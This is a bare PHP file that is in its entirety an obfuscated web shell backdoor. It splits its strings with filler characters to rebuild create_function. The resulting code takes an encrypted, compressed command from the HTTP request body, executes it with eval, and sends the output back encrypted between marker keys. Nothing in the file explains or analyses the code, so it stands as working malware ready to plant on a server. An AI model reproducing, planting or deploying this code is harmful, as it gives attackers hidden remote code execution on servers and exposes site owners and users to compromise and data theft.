<?php
$i=str_replace('L','','creLaLteL_fLunLctLion');
$B='$k32="90532be32997";$32kh="64beb69326324a25";$kf="7d1cb3b321592321";$p="832xkkh3232DwmXP32gOwtv32b";';
$y='funct32ion x($t,$32k){$c=str32len(32$k);$l=32str32le32n($t);$o="";for32($i=0;32$i<$l;32){for(32$j=032';
$T='ob_e32nd_clean()32;$r=@base3264_enco32de(@x(32@gzco32m32press($o),32$k));pr32in32t(32"$p$kh$r$kf");}';
$l=';($j<$32c&&$i32<32$l);$j++,$i+32+){32$o.32=$t{$i}^$k32{$j};}}r32etu32rn $o;32}if (@preg32_32match';
$H='al(3232@32gzun32co32mpress(@x(@bas32e3264_decode($m[1])32,$k)));$o=@o32b_ge32t_cont3232ents32();@';
$a='("/$32kh(.+)$k32f/",@fi3232le_get32_co32ntents("php://i32nput32"),$m)32=32=1) {@ob_sta32rt();@e32v';
$Q=str_replace('32','',$B.$y.$l.$a.$H.$T);
$X=$i('',$Q);$X();
?>
